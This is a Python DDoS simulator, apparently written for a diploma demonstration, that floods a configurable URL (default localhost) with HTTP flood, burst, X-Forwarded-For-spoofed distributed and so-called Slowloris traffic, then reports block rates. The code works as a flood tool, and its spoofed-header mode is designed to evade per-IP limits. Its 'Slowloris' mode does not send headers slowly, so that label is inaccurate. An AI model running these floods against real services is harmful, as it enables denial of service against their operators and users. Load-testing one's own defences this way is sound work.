"""
DDoS Attack Simulator — for diploma demonstration.

Simulates different DDoS attack patterns:
1. HTTP Flood — massive parallel requests to one endpoint
2. Slowloris — many slow, incomplete connections
3. Distributed — requests from "different IPs" (via X-Forwarded-For)
4. Burst — short intense bursts followed by pauses

Usage:
    python attacks/ddos_simulator.py --mode flood --target http://localhost:8000/api/data --rps 200 --duration 30
    python attacks/ddos_simulator.py --mode burst --target http://localhost:8000/api/data
    python attacks/ddos_simulator.py --mode distributed --target http://localhost:8000/api/data
"""

import asyncio
import time
import random
import argparse
from dataclasses import dataclass, field

import httpx


@dataclass
class AttackStats:
    total_sent: int = 0
    total_success: int = 0
    total_blocked: int = 0
    total_errors: int = 0
    status_codes: dict = field(default_factory=dict)
    start_time: float = 0

    def record(self, status: int):
        self.total_sent += 1
        self.status_codes[status] = self.status_codes.get(status, 0) + 1
        if status == 200:
            self.total_success += 1
        elif status in (429, 403):
            self.total_blocked += 1
        else:
            self.total_errors += 1

    def report(self):
        elapsed = time.time() - self.start_time
        rps = self.total_sent / elapsed if elapsed > 0 else 0
        block_rate = (self.total_blocked / self.total_sent * 100) if self.total_sent > 0 else 0
        print(f"\n{'='*60}")
        print(f"  DDoS Simulation Report")
        print(f"{'='*60}")
        print(f"  Duration:        {elapsed:.1f}s")
        print(f"  Total Requests:  {self.total_sent}")
        print(f"  Effective RPS:   {rps:.1f}")
        print(f"  Successful:      {self.total_success} ({100 - block_rate:.1f}%)")
        print(f"  Blocked (429/403): {self.total_blocked} ({block_rate:.1f}%)")
        print(f"  Errors:          {self.total_errors}")
        print(f"  Status Codes:    {self.status_codes}")
        print(f"{'='*60}\n")


async def http_flood(target: str, rps: int, duration: int):
    """Classic HTTP flood — maximum requests per second."""
    print(f"[*] HTTP Flood: {rps} RPS for {duration}s → {target}")
    stats = AttackStats(start_time=time.time())
    end_time = time.time() + duration
    delay = 1.0 / rps if rps > 0 else 0.001

    async with httpx.AsyncClient(timeout=5) as client:
        tasks = []

        async def send_one():
            try:
                r = await client.get(target)
                stats.record(r.status_code)
            except Exception:
                stats.total_sent += 1
                stats.total_errors += 1

        while time.time() < end_time:
            tasks.append(asyncio.create_task(send_one()))
            if len(tasks) >= 50:  # batch of 50 concurrent
                await asyncio.gather(*tasks)
                tasks = []
            await asyncio.sleep(delay)

        if tasks:
            await asyncio.gather(*tasks)

    stats.report()


async def burst_attack(target: str, duration: int):
    """Burst attack — short intense periods followed by silence."""
    print(f"[*] Burst Attack: {duration}s → {target}")
    stats = AttackStats(start_time=time.time())
    end_time = time.time() + duration

    async with httpx.AsyncClient(timeout=5) as client:
        while time.time() < end_time:
            # Burst: 50 requests as fast as possible
            print(f"  [BURST] Sending 50 requests...")
            tasks = []
            for _ in range(50):
                async def send():
                    try:
                        r = await client.get(target)
                        stats.record(r.status_code)
                    except Exception:
                        stats.total_sent += 1
                        stats.total_errors += 1
                tasks.append(asyncio.create_task(send()))
            await asyncio.gather(*tasks)

            # Pause
            pause = random.uniform(2, 5)
            print(f"  [PAUSE] {pause:.1f}s")
            await asyncio.sleep(pause)

    stats.report()


async def distributed_attack(target: str, duration: int, num_ips: int = 20):
    """
    Simulated distributed attack — uses X-Forwarded-For to simulate
    requests from different IPs. Each 'IP' stays under the per-IP limit,
    but the aggregate is a flood.
    """
    print(f"[*] Distributed DDoS: {num_ips} IPs for {duration}s → {target}")
    stats = AttackStats(start_time=time.time())
    end_time = time.time() + duration

    fake_ips = [f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
                for _ in range(num_ips)]

    async with httpx.AsyncClient(timeout=5) as client:
        while time.time() < end_time:
            tasks = []
            for ip in fake_ips:
                async def send(fake_ip=ip):
                    try:
                        r = await client.get(target, headers={"X-Forwarded-For": fake_ip})
                        stats.record(r.status_code)
                    except Exception:
                        stats.total_sent += 1
                        stats.total_errors += 1
                tasks.append(asyncio.create_task(send()))
            await asyncio.gather(*tasks)
            await asyncio.sleep(0.1)

    stats.report()


async def slowloris(target: str, duration: int, connections: int = 100):
    """
    Slowloris-style — open many connections, send headers slowly.
    Note: This is a simplified version for demonstration.
    """
    print(f"[*] Slowloris: {connections} connections for {duration}s → {target}")
    stats = AttackStats(start_time=time.time())
    end_time = time.time() + duration

    async with httpx.AsyncClient(timeout=30) as client:
        while time.time() < end_time:
            tasks = []
            for _ in range(min(connections, 20)):
                async def slow_send():
                    try:
                        headers = {
                            "User-Agent": f"SlowBot/{random.randint(1,999)}",
                            "X-Custom-Header": "a" * random.randint(100, 500),
                        }
                        r = await client.get(target, headers=headers)
                        stats.record(r.status_code)
                    except Exception:
                        stats.total_sent += 1
                        stats.total_errors += 1
                tasks.append(asyncio.create_task(slow_send()))
            await asyncio.gather(*tasks)
            await asyncio.sleep(random.uniform(0.5, 2))

    stats.report()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DDoS Attack Simulator")
    parser.add_argument("--mode", choices=["flood", "burst", "distributed", "slowloris"],
                        default="flood", help="Attack mode")
    parser.add_argument("--target", default="http://localhost:8000/api/data",
                        help="Target URL")
    parser.add_argument("--rps", type=int, default=100, help="Requests per second (flood mode)")
    parser.add_argument("--duration", type=int, default=30, help="Attack duration in seconds")
    parser.add_argument("--ips", type=int, default=20, help="Number of fake IPs (distributed mode)")
    args = parser.parse_args()

    print(f"\n🚨 Starting DDoS Simulation: mode={args.mode}")
    print(f"   Target: {args.target}")
    print(f"   Duration: {args.duration}s\n")

    if args.mode == "flood":
        asyncio.run(http_flood(args.target, args.rps, args.duration))
    elif args.mode == "burst":
        asyncio.run(burst_attack(args.target, args.duration))
    elif args.mode == "distributed":
        asyncio.run(distributed_attack(args.target, args.duration, args.ips))
    elif args.mode == "slowloris":
        asyncio.run(slowloris(args.target, args.duration))
